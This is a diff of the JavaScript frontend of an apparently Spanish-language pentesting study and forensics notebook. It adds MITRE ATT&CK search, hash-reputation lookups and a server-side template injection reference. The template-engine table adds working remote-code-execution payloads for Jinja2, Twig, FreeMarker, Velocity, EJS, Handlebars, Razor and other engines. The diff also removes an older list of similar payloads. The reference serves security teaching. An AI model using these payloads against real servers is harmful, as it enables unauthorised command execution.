+// El buscador consulta a la vez tus técnicas (para filtrarlas) y el catálogo de
+// referencia ATT&CK (para poder añadir las que no tengas), como el buscador de CVEs.
 let _mitreSearchTimer=null;
 function searchMitre(q){
   clearTimeout(_mitreSearchTimer);
-  _mitreSearchTimer=setTimeout(async()=>{
-    if(!q.trim()){loadMitre();return;}
-    try{
-      const rows=await API.get('/api/mitre/search?q='+encodeURIComponent(q));
-      document.getElementById('mitreTotalBadge').textContent=rows.length+' resultados';
-      if(!rows.length){
-        document.getElementById('mitreBody').innerHTML='<div class="empty-msg">Sin resultados para "'+esc(q)+'"</div>';
-        return;
-      }
-      // Re-group by tactic for render
+  _mitreSearchTimer=setTimeout(()=>doMitreSearch(q),280);
+}
+// Botón ✕ del buscador: vacía el campo y vuelve a la vista general.
+function clearMitreSearch(){
+  const inp=document.getElementById('mitreSearch');
+  inp.value=''; inp.focus();
+  loadMitre();
+}
+async function doMitreSearch(q){
+  const body=document.getElementById('mitreBody');
+  if(!q.trim()){ loadMitre(); return; }
+  try{
+    const [saved,ref]=await Promise.all([
+      API.get('/api/mitre/search?q='+encodeURIComponent(q)),
+      API.get('/api/mitre/reference?q='+encodeURIComponent(q)),
+    ]);
+    document.getElementById('mitreTotalBadge').textContent=saved.length+' en tu módulo';
+    let html='';
+    if(saved.length){
       const grouped={};
-      rows.forEach(r=>{const t=r.tactic||'Uncategorized';(grouped[t]=grouped[t]||[]).push(r);});
-      renderMitreTactics(grouped);
-    }catch(e){}
-  },280);
+      saved.forEach(r=>{const t=r.tactic||'Uncategorized';(grouped[t]=grouped[t]||[]).push(r);});
+      html+='<div style="font-size:10px;font-family:var(--mono);color:var(--text3);margin-bottom:6px;">EN TU MÓDULO</div>'+renderMitreTactics(grouped);
+    }
+    html+=renderMitreRefResults(ref.results||[]);
+    body.innerHTML=html||`<div class="empty-msg">Sin resultados para "${esc(q)}" (ni en tu módulo ni en el catálogo ATT&CK)</div>`;
+  }catch(e){
+    body.innerHTML=`<div class="empty-msg" style="color:var(--orange)">Error buscando: ${esc(e.message||String(e))}</div>`;
+  }
+}
+
+// Resultados del catálogo de referencia con botón para añadir (o marca de "ya la tienes").
+function renderMitreRefResults(results){
+  if(!results.length) return '';
+  const rows=results.map(t=>{
+    const col=mitreTacticColor((t.tactics||[])[0]);
+    const turl='https://attack.mitre.org/techniques/'+t.id.replace('.','/');
+    return `<div class="enum-cmd-card" style="margin-bottom:6px;">
+      <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
+        <a href="${turl}" target="_blank" style="font-size:11px;font-family:var(--mono);color:${col};background:${col}22;padding:1px 6px;border-radius:4px;text-decoration:none;">${esc(t.id)}</a>
+        <span style="font-size:12px;color:var(--text1);font-weight:600;">${esc(t.name)}</span>
+        ${(t.tactics||[]).map(tc=>`<span style="font-size:9px;color:var(--text3);border:1px solid var(--border);border-radius:8px;padding:1px 6px;">${esc(tc)}</span>`).join('')}
+        <div style="flex:1"></div>
+        <span class="mitre-ref-action" style="display:inline-flex;align-items:center;gap:12px;">${mitreRefAction(t.id)}</span>
+      </div>
+      ${t.desc?`<div style="font-size:10px;color:var(--text3);margin-top:4px;">${esc(t.desc)}</div>`:''}
+    </div>`;
+  }).join('');
+  return `<div style="margin-top:14px;"><div style="font-size:10px;font-family:var(--mono);color:var(--cyan);margin-bottom:6px;">➕ AÑADIR DESDE ATT&CK (${results.length})</div>${rows}</div>`;
 }
 
 // ─── AUDIT ────────────────────────────────────────────────────────────────────
@@ -4010,8 +4265,8 @@ function printReport(){
 
 async function runForensic(){
   const hash=(document.getElementById('forensicHash').value||'').trim().toLowerCase();
-  if(hash.length!==64||!/^[0-9a-f]{64}$/.test(hash)){
-    setStatus('SHA256 inválido — debe tener exactamente 64 caracteres hexadecimales','error');
+  if(!/^[0-9a-f]{32}$|^[0-9a-f]{40}$|^[0-9a-f]{64}$/.test(hash)){
+    setStatus('Hash inválido — se admite MD5 (32), SHA1 (40) o SHA256 (64 hex)','error');
     return;
   }
   const btn=document.getElementById('btnForensic');
@@ -4030,7 +4285,8 @@ async function runForensic(){
   body.innerHTML=`<div style="text-align:center;padding:40px;color:var(--text3);font-family:var(--mono)">
     <div style="font-size:28px;margin-bottom:8px">⟳</div>
     Ejecutando pipeline forense...<br>
-    <span style="font-size:10px;">VT + MalwareBazaar en paralelo, luego síntesis IA</span>
+    <span style="font-size:10px;">VT + MalwareBazaar en paralelo, luego síntesis IA</span><br>
+    <span style="font-size:10px;color:var(--text3);opacity:.8;">⏳ la síntesis de la IA puede tardar ~1 minuto, es normal</span>
   </div>`;
 
   try{
@@ -4039,15 +4295,19 @@ async function runForensic(){
     const data=await r.json();
     _setFStep('vt', data.vt?.error?'error':'ok');
     _setFStep('mb', data.mb?.error?'error':'ok');
-    _setFStep('ar', data.anyrun?.error?'error':(data.anyrun?.tasks?.length>0?'ok':'skip'));
-    _setFStep('ai','ok');
+    _setFStep('ar', data.anyrun?.tasks?.length>0?'ok':'skip');
+    _setFStep('ai', data.no_data?'skip':'ok');
     renderForensicResult(hash, data);
     await loadAll();  // refresh notes/CVEs/MITRE counts
-    setStatus('Nota forense generada — '+data.title);
+    setStatus(data.no_data?('Hash sin datos de reputación — nota "sin datos" guardada'):('Nota forense generada — '+data.title));
   }catch(e){
     ['vt','mb','ar','ai'].forEach(s=>_setFStep(s,'error'));
-    body.innerHTML=`<div class="empty-msg" style="color:var(--red)">Error en pipeline: ${esc(String(e))}</div>`;
-    setStatus('Error forense: '+e.message,'error');
+    const msg=String(e.message||e);
+    // 1C: si el fallo es de API keys, avisamos claramente (no como error genérico)
+    const esKeys=/API keys/i.test(msg);
+    body.innerHTML=`<div class="empty-msg" style="color:${esKeys?'var(--orange)':'var(--red)'}">${esKeys?'⚠ ':''}${esc(msg)}${esKeys?'<br><span style="font-size:11px;color:var(--text3)">Ábrelo con el botón de Ajustes (⚙) y verifica VirusTotal y MalwareBazaar.</span>':''}</div>`;
+    setStatus(esKeys?'Faltan/fallan las API keys — revísalas en Ajustes':('Error forense: '+e.message),'error');
+    if(esKeys) initForensic();  // refresca el banner de keys
   }finally{
     btn.disabled=false;btn.textContent='▶ Analizar';
     document.getElementById('forensicProgress').style.display='none';
@@ -4064,8 +4324,21 @@ function _setFStep(step,state){
   el.style.borderColor=col+'88';
 }
 
+let _forensicShowing=false;   // ¿el body está mostrando un resultado? (para no pisarlo con el historial)
+let _forensicIOCs='';         // indicadores del último resultado, para el botón "⎘ IOCs"
+function copyForensicIOCs(btn){ enumCopy(btn, _forensicIOCs); }
 function renderForensicResult(hash, data){
+  _forensicShowing=true;
   const body=document.getElementById('forensicBody');
+  if(data.no_data){
+    body.innerHTML=`<div style="max-width:720px;margin:0 auto;">
+      <div style="background:rgba(255,102,0,.08);border:1px solid rgba(255,102,0,.3);border-radius:var(--r);padding:14px;color:var(--orange);font-size:12px;">
+        <b>Sin datos de reputación</b> para <code style="color:var(--text2)">${esc(hash.slice(0,20))}…</code><br>
+        <span style="font-size:11px;color:var(--text3)">Ni VirusTotal ni MalwareBazaar conocen este hash (muestra desconocida o nunca subida). No se ha generado análisis para no especular sin datos.</span>
+        <div style="margin-top:8px;"><a href="#" onclick="loadNote(${data.note_id});switchTab('editor');return false" style="font-size:11px;color:var(--green);">✎ Ver nota #${data.note_id}</a></div>
+      </div></div>`;
+    return;
+  }
   const vt=data.vt||{};
   const mb=data.mb||{};
   const anyrun=data.anyrun||{};
@@ -4091,11 +4364,27 @@ function renderForensicResult(hash, data){
       `).join('')}
     </div>`:'';
 
+  // E — tipo de hash (por longitud). B — indicadores (IOCs) para copiar.
+  const htype=hash.length===32?'MD5':hash.length===40?'SHA1':'SHA256';
+  const _asStr=x=>typeof x==='string'?x:(x&&(x.id||x.value)||'');
+  const _domains=(vt.contacted_domains||[]).map(_asStr).filter(Boolean);
+  const _ips=(vt.contacted_ips||[]).map(_asStr).filter(Boolean);
+  const _names=[...new Set([vt.file_name, mb.file_name, ...(vt.names||[])].filter(Boolean))];
+  const iocLines=['Hash ('+htype+'): '+hash];
+  const fam=mb.signature||vt.suggested_label||vt.family; if(fam) iocLines.push('Familia: '+fam);
+  if(_names.length) iocLines.push('Nombres: '+_names.join(', '));
+  if(_domains.length) iocLines.push('Dominios C2: '+_domains.join(', '));
+  if(_ips.length) iocLines.push('IPs C2: '+_ips.join(', '));
+  _forensicIOCs=iocLines.join('\n');
+
   let html=`
     <div style="margin-bottom:16px;">
-      <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:10px;">
+      <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:10px;">
         <span style="font-family:var(--mono);font-size:13px;color:${scoreCol};font-weight:700">${det}/${tot} motores</span>
         <span style="font-size:12px;color:var(--text2)">${esc(vt.suggested_label||vt.family||mb.file_name||hash.slice(0,16)+'…')}</span>
+        <span class="tool-badge" style="color:var(--text3);border-color:var(--border2);background:var(--bg4)">${htype}</span>
+        <button class="enum-copy-btn" onclick='enumCopy(this,${jarg(hash)})' title="Copiar el hash">⎘ hash</button>
+        <button class="enum-copy-btn" onclick="copyForensicIOCs(this)" title="Copiar indicadores: hash, familia, nombres y red (si hay)">⎘ IOCs</button>
         <a href="#" onclick="loadNote(${data.note_id});switchTab('editor');return false"
           style="font-size:11px;padding:3px 10px;background:var(--bg4);border:1px solid var(--green);border-radius:4px;color:var(--green);text-decoration:none;">
           ✎ Ver nota #${data.note_id}</a>
@@ -4164,10 +4453,109 @@ function clearForensic(){
   document.getElementById('forensicHash').value='';
   document.getElementById('forensicHash').style.borderColor='';
   document.getElementById('forensicPipeline').style.display='none';
-  document.getElementById('forensicBody').innerHTML=`<div style="text-align:center;padding:50px;color:var(--text3);font-family:var(--mono);font-size:12px;">
-    <div style="font-size:36px;margin-bottom:10px;opacity:.3;">🔬</div>
-    Introduce un hash SHA256 para iniciar el análisis forense automático
+  _forensicShowing=false;
+  document.getElementById('forensicBody').innerHTML=forensicIdleHTML();
+}
+
+// 1A — Calcula el SHA256 del fichero en el NAVEGADOR (crypto.subtle). El binario
+// NO sale de tu equipo, solo su hash → evita subir malware y líos con el antivirus.
+async function hashFile(file){
+  if(!file) return;
+  setStatus('Calculando SHA256 de "'+file.name+'"…');
+  try{
+    const buf=await file.arrayBuffer();
+    const digest=await crypto.subtle.digest('SHA-256', buf);
+    const hex=[...new Uint8Array(digest)].map(b=>b.toString(16).padStart(2,'0')).join('');
+    const inp=document.getElementById('forensicHash');
+    inp.value=hex; inp.dispatchEvent(new Event('input'));
+    setStatus('SHA256 de "'+file.name+'" calculado (el fichero no se subió). Pulsa Analizar.');
+  }catch(e){ setStatus('No se pudo calcular el hash: '+e.message,'error'); }
+}
+
+// Al entrar al módulo: avisa si faltan keys esenciales (1C) y, si no hay un
+// resultado en pantalla, muestra el historial de análisis (2C).
+async function initForensic(){
+  try{
+    const k=await API.get('/api/forensic/keys');
+    const missing=[];
+    if(!k.virustotal) missing.push('VirusTotal');
+    if(!k.malwarebazaar) missing.push('MalwareBazaar');
+    const banner=document.getElementById('forensicKeysBanner');
+    if(missing.length){
+      banner.style.display='';
+      banner.innerHTML='⚠ Faltan API keys ('+missing.join(', ')+'). Configúralas con el botón de Ajustes (⚙) para poder analizar.';
+    } else banner.style.display='none';
+    // D — el paso Any.run solo se muestra si su key está configurada (es opcional)
+    const showAR=!!k.anyrun;
+    ['fstep-ar','farrow-ar'].forEach(id=>{const el=document.getElementById(id);if(el)el.style.display=showAR?'':'none';});
+  }catch(e){/* el chequeo de keys es best-effort: si falla, sin banner y a seguir */}
+  if(!_forensicShowing) document.getElementById('forensicBody').innerHTML=forensicIdleHTML();
+}
+
+// Estado de reposo: placeholder + historial de análisis anteriores.
+function forensicIdleHTML(){
+  return `<div style="text-align:center;padding:26px 10px 18px;color:var(--text3);font-family:var(--mono);font-size:12px;">
+      <div style="font-size:36px;margin-bottom:10px;opacity:.3;">🔬</div>
+      Introduce un hash (MD5/SHA1/SHA256) o elige un fichero para analizar<br>
+      <span style="font-size:10px;">Pipeline: VirusTotal + MalwareBazaar + Any.run → Nota generada por IA</span>
+    </div>`+renderForensicHistory();
+}
+
+// Veredicto de 2 palabras (badge) según la etiqueta veredicto:* guardada en la nota.
+const FORENSIC_VERDICT={
+  infeccion:  ['Posible infección','var(--red)',   'rgba(255,51,68,.12)'],
+  sospechoso: ['Sospechoso',       'var(--orange)','rgba(255,102,0,.12)'],
+  limpio:     ['No infectado',     'var(--green)', 'rgba(0,255,136,.12)'],
+  'sin-datos':['Sin datos',        'var(--text3)', 'var(--bg4)'],
+};
+function forensicVerdictBadge(note){
+  // Si identificamos la familia con confianza (etiqueta familia:*), mostramos el
+  // NOMBRE (ej. 🦠 WannaCry) en vez del veredicto genérico.
+  const fam=(note.tags||[]).find(t=>t.startsWith('familia:'));
+  if(fam){
+    const name=fam.slice(8);
+    return `<span title="Familia identificada" style="flex-shrink:0;font-size:9px;font-family:var(--mono);font-weight:700;color:var(--red);background:rgba(255,51,68,.12);border:1px solid var(--red);border-radius:10px;padding:2px 8px;white-space:nowrap;">🦠 ${esc(name)}</span>`;
+  }
+  const tag=(note.tags||[]).find(t=>t.startsWith('veredicto:'));
+  const v=tag&&FORENSIC_VERDICT[tag.slice(10)];
+  if(!v) return '';
+  return `<span style="flex-shrink:0;font-size:9px;font-family:var(--mono);font-weight:700;color:${v[1]};background:${v[2]};border:1px solid ${v[1]};border-radius:10px;padding:2px 8px;white-space:nowrap;">${v[0]}</span>`;
+}
+
+// 2C — Lista de informes forenses anteriores (notas categoría "forense").
+function renderForensicHistory(){
+  const notes=(S.notes||[]).filter(n=>n.category==='forense')
+    .sort((a,b)=>(b.created_at||'').localeCompare(a.created_at||''));
+  if(!notes.length) return '';
+  return `<div style="max-width:720px;margin:0 auto;">
+    <div style="font-size:10px;font-family:var(--mono);color:var(--text3);margin-bottom:8px;">ANÁLISIS ANTERIORES (${notes.length})</div>
+    ${notes.map(n=>`<div onclick="loadNote(${n.id});switchTab('editor')" title="Abrir informe" style="cursor:pointer;background:var(--bg3);border:1px solid var(--border);border-radius:var(--r);padding:8px 12px;margin-bottom:6px;display:flex;align-items:center;gap:10px;">
+      <span style="font-size:14px;">🔬</span>
+      <div style="flex:1;min-width:0;">
+        <div style="font-size:12px;color:var(--text);font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${esc(n.title||'(sin título)')}</div>
+        <div style="font-size:9px;color:var(--text3);font-family:var(--mono);">${esc((n.created_at||'').slice(0,10))}${n.summary?' · '+esc(n.summary.slice(0,70)):''}</div>
+      </div>
+      ${forensicVerdictBadge(n)}
+      <button onclick="deleteForensicNote(${n.id},event)" title="Borrar informe" style="background:none;border:none;color:var(--red);cursor:pointer;padding:0;line-height:0;display:inline-flex;align-items:center;flex-shrink:0;">${TRASH_SVG}</button>
+      <span style="font-size:10px;color:var(--cyan);flex-shrink:0;">ver →</span>
+    </div>`).join('')}
   </div>`;
+}
+
+// C — Borrar un informe forense desde el histórico (borra la nota).
+async function deleteForensicNote(id, ev){
+  if(ev) ev.stopPropagation();
+  if(!confirm('¿Borrar este informe forense?')) return;
+  try{
+    await API.del('/api/notes/'+id);
+    await loadAll();
+    _forensicShowing=false;
+    document.getElementById('forensicBody').innerHTML=forensicIdleHTML();
+    setStatus('Informe forense borrado');
+  }catch(e){
+    if(e.status===404){ await loadAll(); document.getElementById('forensicBody').innerHTML=forensicIdleHTML(); }
+    else setStatus('Error borrando: '+e.message,'error');
+  }
 }
 
 // ─── HELPERS ──────────────────────────────────────────────────────────────────
@@ -4574,12 +4962,42 @@ const WEB_VULNS=[
     sub:'Inyección en motores de plantillas → de inyección simple a RCE.',
     desc:'La entrada del usuario se concatena directamente en una plantilla del lado servidor. Según el motor puede escalar de simple inyección a ejecución remota de comandos.',
     detection:`Inyectar el polyglot \${{<%[%'"}}%\\ para provocar error, luego probar {{7*7}} — si la respuesta muestra 49, hay evaluación de plantilla.`,
+    // Motores de plantillas (misma tabla que la de clase). `payload`/`result` solo
+    // en los 4 que se vieron en clase (7*7→49); el resto se deja vacío para no
+    // inventar. `rce` = payload real de ejecución (verificados en PayloadsAllTheThings)
+    // y se abre en un modal porque son largos. Handlebars lleva `note` en vez de
+    // payload porque es logic-less: no evalúa aritmética, así que no tiene probe 7*7.
     engineTable:[
-      {payload:'{{7*7}}',       result:'49', engine:'Jinja2 / Tornado (Python) o Twig (PHP)'},
-      {payload:'<%= 7*7 %>',    result:'49', engine:'ERB (Ruby)'},
-      {payload:'${7*7}',        result:'49', engine:'FreeMarker (Java)'},
-      {payload:'@(7*7)',        result:'49', engine:'Razor (.NET)'},
-      {payload:'#{7*7}',        result:'49', engine:'Ruby / Thymeleaf'},
+      {lang:'Python',  engine:'Jinja2',     payload:'{{7*7}}',    result:'49', rce:`{{namespace.__init__.__globals__.os.popen('id').read()}}`},
+      {lang:'Python',  engine:'Mako',       payload:'${7*7}',         result:'49', rce:"<%import os%>${os.popen('id').read()}"},
+      {lang:'PHP',     engine:'Twig',       payload:'{{7*7}}',        result:'49', rce:"{{['id']|filter('system')}}"},
+      {lang:'PHP',     engine:'Smarty',     payload:'{7*7}',          result:'49', rce:"{system('id')}"},
+      {lang:'Java',    engine:'FreeMarker', payload:'${7*7}',         result:'49', rce:'<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'},
+      {lang:'Java',    engine:'Velocity',   payload:'#set($x=7*7)$x', result:'49', rce:'#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")'},
+      {lang:'Java',    engine:'Thymeleaf',  payload:'[[${7*7}]]',     result:'49', rce:"[[${T(java.lang.Runtime).getRuntime().exec('id')}]]"},
+      {lang:'Ruby',    engine:'ERB',        payload:'<%= 7*7 %>',     result:'49', rce:"<%= system('id') %>"},
+      {lang:'Node.js', engine:'EJS',        payload:'<%= 7*7 %>',     result:'49', rce:"<%= global.process.mainModule.require('child_process').execSync('id') %>"},
+      {lang:'Node.js', engine:'Pug',        payload:'#{7*7}',         result:'49', rce:"#{global.process.mainModule.require('child_process').execSync('id')}"},
+      {lang:'Node.js', engine:'Handlebars', payload:'',               result:'',   note:'No evalúa aritmética (logic-less): {{7*7}} no devuelve 49. Se detecta por error o inyección de propiedad.', rce:`{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('id');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}`},
+      {lang:'.NET',    engine:'Razor',      payload:'@(7*7)',         result:'49', rce:'@{ System.Diagnostics.Process.Start("cmd.exe","/c whoami"); }'},
     ],
   },
   {
@@ -4835,22 +5253,14 @@ function openWebVuln(id){
       </div></div>`;
   }
 
+  // Tabla de motores SSTI: Lenguaje · Motor · Payload de prueba · Resultado · RCE.
+  // Las celdas sin dato muestran «—»; si el motor trae `note` (Handlebars) se pinta
+  // en lugar del payload; el RCE va en un botón que abre openRceModal (payloads largos).
   if(v.engineTable){
-    html+=`<div class="wv-sec"><div class="wv-sec-title det">Identificación de motor</div>
-      <table class="wv-eng-table"><thead><tr><th>Payload</th><th>Resultado</th><th>Motor</th></tr></thead><tbody>
-      ${v.engineTable.map(r=>`<tr><td>${esc(r.payload)}</td><td>${esc(r.result)}</td><td>${esc(r.engine)}</td></tr>`).join('')}
+    html+=`<div class="wv-sec"><div class="wv-sec-title det">Motores de plantillas</div>
+      <table class="wv-eng-table"><thead><tr><th>Lenguaje</th><th>Motor</th><th>Payload de prueba</th><th>Resultado</th><th>Payload real (RCE)</th></tr></thead><tbody>
+      ${v.engineTable.map(r=>`<tr><td>${esc(r.lang)}</td><td>${esc(r.engine)}</td><td>${r.payload?esc(r.payload):(r.note?`<span style="color:var(--text3);font-style:italic;">${esc(r.note)}</span>`:'<span style="color:var(--text3)">—</span>')}</td><td>${r.result?esc(r.result):'<span style="color:var(--text3)">—</span>'}</td><td>${r.rce?`<button class="wv-rce-btn" onclick='openRceModal(${jarg(r.engine)},${jarg(r.rce)})'>Ver RCE</button>`:'<span style="color:var(--text3)">—</span>'}</td></tr>`).join('')}
       </tbody></table></div>`;
-  }
-
-  if(v.id==='ssti'){
-    const probeOpts=['{{7*7}}','<%= 7*7 %>','${7*7}','@(7*7)','#{7*7}','{7*7}','#set($x=7*7)$x']
-      .map(pp=>`<option value="${esc(pp)}">${esc(pp)}</option>`).join('');
-    html+=`<div class="wv-sec"><div class="wv-sec-title pay">Identificador de motor (interactivo)</div>
-      <div class="enum-generator" style="border-color:rgba(0,221,255,.3);">
-        <div class="enum-gen-row"><span class="enum-gen-label">Payload probado</span><select class="enum-gen-sel" id="sstiProbe" onchange="identifySsti()" style="flex:1;">${probeOpts}</select></div>
-        <div class="enum-gen-row" style="align-items:flex-start;"><span class="enum-gen-label">Respuesta vista</span><input type="text" class="enum-gen-input" id="sstiResp" oninput="identifySsti()" placeholder="Pega lo que devolvió el servidor (ej: 49)"></div>
-        <div id="sstiIdOut" style="margin-top:8px;"></div>
-      </div></div>`;
   }
 
   if(v.payloads){
@@ -4876,50 +5286,6 @@ function openWebVuln(id){
   d.innerHTML=html;
   const sc=document.getElementById('webvulnScroll'); if(sc) sc.scrollTop=0;
   if(v.generator){ _sqliCat='detect'; renderSqliGen(); }
-  if(v.id==='ssti') identifySsti();
-}
-
-// ─── SSTI ENGINE IDENTIFIER ───────────────────────────────────────────────────
-// probe = payload que devuelve 49 en ese motor; rce = payload de ejecución
-const SSTI_ENGINES=[
-  {engine:'Jinja2',    lang:'Python',  probe:'{{7*7}}',    rce:`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`},
-  {engine:'Tornado',   lang:'Python',  probe:'{{7*7}}',    rce:`{% import os %}{{ os.popen('id').read() }}`},
-  {engine:'Mako',      lang:'Python',  probe:'${7*7}',     rce:`\${__import__('os').popen('id').read()}`},
-  {engine:'ERB',       lang:'Ruby',    probe:'<%= 7*7 %>', rce:'<%= `id` %>'},
-  {engine:'FreeMarker',lang:'Java',    probe:'${7*7}',     rce:`<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`},
-  {engine:'Velocity',  lang:'Java',    probe:'#set($x=7*7)$x', rce:`#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")`},
-  {engine:'Twig',      lang:'PHP',     probe:'{{7*7}}',    rce:`{{['id']|filter('system')}}`},
-  {engine:'Smarty',    lang:'PHP',     probe:'{7*7}',      rce:`{system('id')}`},
-  {engine:'Nunjucks',  lang:'Node.js', probe:'{{7*7}}',    rce:`{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}`},
-  {engine:'Razor',     lang:'.NET',    probe:'@(7*7)',     rce:`@{ System.Diagnostics.Process.Start("cmd.exe","/c id"); }`},
-  {engine:'Thymeleaf', lang:'Java',    probe:'#{7*7}',     rce:`[[\${T(java.lang.Runtime).getRuntime().exec('id')}]]`},
-];
-
-function identifySsti(){
-  const probe=document.getElementById('sstiProbe').value;
-  const resp=(document.getElementById('sstiResp').value||'').trim();
-  const out=document.getElementById('sstiIdOut');
-  const candidates=SSTI_ENGINES.filter(e=>e.probe===probe);
-  const evaluated=resp.includes('49');
-  let banner='';
-  if(resp){
-    banner=evaluated
-      ? `<div class="enum-note" style="background:rgba(0,255,136,.06);border-color:rgba(0,255,136,.3);color:var(--green);">✓ La respuesta contiene "49" — la plantilla evalúa expresiones. SSTI confirmado.</div>`
-      : `<div class="enum-note">La respuesta no contiene "49". Si el payload se refleja sin evaluar, prueba otro motor/sintaxis o revisa el contexto.</div>`;
-  }
-  out.innerHTML=banner+`<div style="font-size:11px;color:var(--text3);margin:8px 0 4px;font-family:var(--mono);">Motores que responden a <span style="color:var(--orange)">${esc(probe)}</span> con RCE:</div>`+
-    candidates.map(e=>`
-      <div class="enum-cmd-card">
-        <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;">
-          <span style="font-size:12px;font-weight:700;color:var(--cyan);font-family:var(--mono);">${esc(e.engine)}</span>
-          <span style="font-size:9px;color:var(--text3);background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:1px 6px;font-family:var(--mono);">${esc(e.lang)}</span>
-        </div>
-        <div class="enum-cmd-row" style="align-items:flex-start;">
-          <div class="enum-cmd-code" style="white-space:pre-wrap;word-break:break-all;">${esc(e.rce)}</div>
-          <button class="enum-copy-btn" onclick='enumCopy(this,${jarg(e.rce)})'>⎘ Copiar</button>
-          <button class="enum-save-btn" title="Guardar en KB" onclick='saveCmdKB(this,${jarg(e.rce)},${jarg('SSTI RCE — '+e.engine+' ('+e.lang+')')},"web","Web Exploitation","web-exploitation",["web-exploitation","ssti"])'>💾</button>
-        </div>
-      </div>`).join('');
 }
 
 // ─── DICTIONARIES & POLYGLOTS ─────────────────────────────────────────────────
@@ -5042,10 +5408,10 @@ function applyEnumTarget(){
   document.querySelectorAll('#panel-enum [data-tpl]').forEach(code=>{
     code.textContent = t ? code.dataset.tpl.replace(/\bIP\b/g,t) : code.dataset.tpl;
   });
-  // Generador Nmap (②): usa el objetivo, o la IP de ejemplo si está vacío
+  // Generador Nmap (Escanear puertos): usa el objetivo, o la IP de ejemplo si está vacío
   const ipField=document.getElementById('nmapIP');
   if(ipField){ ipField.value = t || _ENUM_EXAMPLE_IP; buildNmapCmd(); }
-  // Generador de descubrimiento (①): si el objetivo es una IPv4, deriva su /24
+  // Generador de descubrimiento (Descubrir la red): si el objetivo es una IPv4, deriva su /24
   const netField=document.getElementById('genNetRange');
   if(netField){
     if(/^\d{1,3}(\.\d{1,3}){3}$/.test(t)) netField.value=t.replace(/\.\d{1,3}$/,'.0')+'/24';
@@ -5063,6 +5429,17 @@ function syncEnumRange(){
     code.textContent=code.dataset.rangetpl.replace('§R§',range);
   });
 }
+
+// Modal reutilizable para el payload de RCE de un motor SSTI. Se abre desde el
+// botón «Ver RCE» de la tabla de motores; copyRce reaprovecha enumCopy (feedback ✓).
+function openRceModal(engine,cmd){
+  document.getElementById('rceTitle').textContent='RCE — '+engine;
+  document.getElementById('rceCode').textContent=cmd;
+  const btn=document.getElementById('rceCopyBtn');
+  btn.textContent='⎘ Copiar'; btn.style.color=''; btn.style.borderColor='';
+  document.getElementById('rceModal').classList.add('show');
+}
+function copyRce(btn){ enumCopy(btn, document.getElementById('rceCode').textContent); }
 
 function enumCopy(btn,text){
   navigator.clipboard.writeText(text).then(()=>{
@@ -5091,30 +5468,25 @@ function toggleEnumFlag(flag){
   buildNmapCmd();
 }
 
-// #3 Puente puertos abiertos → servicios de ③
+// Puente: puertos abiertos → resaltar servicios (Enumerar servicios)
 function highlightServices(){
   const raw=(document.getElementById('nmapPorts')?.value||'').trim();
   const svc=document.getElementById('svcOpenPorts');
-  if(svc && svc.value!==raw) svc.value=raw;   // sincroniza el campo de ③ (sin disparar oninput)
+  if(svc && svc.value!==raw) svc.value=raw;   // sincroniza el campo de Enumerar servicios (sin disparar oninput)
   const open=new Set((raw.match(/\d+/g)||[]).map(Number));
   const any=open.size>0;
-  const onlyOpen=(document.getElementById('svcOnlyOpen')?.checked)&&any;
   document.querySelectorAll('#esec-services .enum-accordion').forEach(acc=>{
     const ports=(acc.querySelector('.enum-acc-port')?.textContent.match(/\d+/g)||[]).map(Number);
-    const isOpen=ports.some(p=>open.has(p));
-    acc.classList.toggle('svc-open', isOpen&&any);
-    acc.hidden = onlyOpen && !isOpen;
+    acc.classList.toggle('svc-open', ports.some(p=>open.has(p))&&any);
   });
   document.querySelectorAll('#tblOtrosServicios tbody tr').forEach(tr=>{
     const ports=(tr.querySelector('td')?.textContent.match(/\d+/g)||[]).map(Number);
-    const isOpen=ports.some(p=>open.has(p));
-    tr.classList.toggle('svc-open-row', isOpen&&any);
-    tr.hidden = onlyOpen && !isOpen;
+    tr.classList.toggle('svc-open-row', ports.some(p=>open.has(p))&&any);
   });
   const hint=document.getElementById('svcOpenHint');
   if(hint) hint.textContent = any
     ? ('Resaltando servicios de: '+[...open].sort((a,b)=>a-b).join(', '))
-    : 'Escribe aquí los puertos abiertos (o rellénalos en ②) para resaltar sus servicios.';
+    : 'Escribe aquí los puertos abiertos (o rellénalos en Escanear puertos) para resaltar sus servicios.';
 }
 function onNmapPortsChanged(){ buildNmapCmd(); highlightServices(); }
 
@@ -5126,17 +5498,50 @@ async function searchExploitDB(){
   out.innerHTML='<div style="font-size:11px;color:var(--text3);font-family:var(--mono)">Buscando en Exploit-DB…</div>';
   try{
     const data=await API.get('/api/exploit-search?q='+encodeURIComponent(q));
+    // Fallo de Exploit-DB (502/timeout…): NO es "no hay exploits", es que no
+    // respondió. Lo distinguimos y ofrecemos reintentar (EDB corta intermitente).
+    if(data.error && !data.count){
+      out.innerHTML='<div style="font-size:11px;color:var(--orange)">⚠ Exploit-DB no respondió ('+esc(data.error)+'). <a href="#" onclick="searchExploitDB();return false;" style="color:var(--cyan)">reintentar</a></div>';
+      return;
+    }
     if(!data.count){
-      out.innerHTML='<div style="font-size:11px;color:var(--text3)">Sin exploits públicos para <b>'+esc(q)+'</b>.'+(data.error?' <span style="color:var(--orange)">('+esc(data.error)+')</span>':'')+'</div>';
+      out.innerHTML='<div style="font-size:11px;color:var(--text3)">Sin exploits públicos para <b>'+esc(q)+'</b>.</div>';
       return;
     }
